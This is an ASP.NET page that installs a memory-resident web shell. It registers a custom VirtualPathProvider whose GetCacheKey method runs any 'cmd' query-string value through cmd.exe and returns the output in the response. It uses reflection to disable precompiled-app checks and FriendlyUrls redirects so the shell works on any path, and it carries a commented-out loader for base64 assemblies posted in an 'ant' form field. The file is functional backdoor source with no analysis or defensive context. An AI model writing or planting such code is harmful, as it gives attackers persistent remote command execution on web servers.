<%@ Page Language="c#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Web.Mvc" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        public override string GetCacheKey(string virtualPath)
        {
            try
            {
                HttpContext context = HttpContext.Current;
                String cmd = context.Request.QueryString["cmd"];
                if (cmd != null)
                {
                    HttpResponseBase response = new HttpResponseWrapper(context.Response);
                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = "/c " + cmd;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.Start();
                    byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                    response.Write(System.Text.Encoding.Default.GetString(data));
                }
                /*String Payload = context.Request.Form["ant"];
                if (Payload != null)
                {
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                    context.Response.End();
                }*/
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return Previous.GetCacheKey(virtualPath);
        }
    }
</script>

<%
    System.Reflection.FieldInfo field_isPrecompiledAppComputed = null;
    System.Reflection.FieldInfo field_isPrecompiledApp = null;
    object field_theBuildManager_instance = null;
    object field_isPrecompiledAppComputed_oldValue = null;
    object field_isPrecompiledApp_oldValue = null;

    var typeBuildManager = typeof(System.Web.Compilation.BuildManager);
    System.Reflection.FieldInfo field_theBuildManager = typeBuildManager.GetField("_theBuildManager",
                                                                                  System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
    field_isPrecompiledAppComputed = typeBuildManager.GetField("_isPrecompiledAppComputed",
                                                               System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
    field_isPrecompiledApp = typeBuildManager.GetField("_isPrecompiledApp",
                                                       System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
    field_theBuildManager_instance = field_theBuildManager.GetValue(null);
    field_isPrecompiledApp_oldValue = field_isPrecompiledApp.GetValue(field_theBuildManager_instance);

    if ((bool)field_isPrecompiledApp_oldValue)
    {
        // To disable isPrecompiledApp settings
        field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, true);
        field_isPrecompiledApp.SetValue(field_theBuildManager_instance, false);
    }
    
    foreach (var route in System.Web.Routing.RouteTable.Routes)
    {
        if (route.GetType().FullName == "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute")
        {
            var FriendlySetting = route.GetType().GetProperty("Settings", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);
            var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings();
            settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off;
            FriendlySetting.SetValue(route, settings);
        }
    }

    try
    {
        SamplePathProvider sampleProvider = new SamplePathProvider();
        HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);
        sampleProvider.InitializeLifetimeService();
    }
    catch (System.Exception error)
    {
        Console.WriteLine(error);
    }
%>